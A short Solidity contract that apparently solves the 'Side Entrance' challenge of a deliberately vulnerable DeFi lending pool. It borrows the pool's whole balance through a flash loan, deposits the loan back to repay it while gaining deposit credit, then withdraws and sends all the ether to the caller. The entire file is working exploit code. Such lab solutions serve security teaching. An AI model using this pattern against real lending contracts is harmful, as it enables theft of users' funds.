// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    function flashloan(address pool) external {
        SideEntranceLenderPool(pool).flashLoan(pool.balance);
    }

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function withdraw(address pool) external {
        SideEntranceLenderPool(pool).withdraw();
        (bool success,) = address(msg.sender).call{value:address(this).balance}("");
        require(success, "Failed to send ether");
    }
    receive() external payable {}
}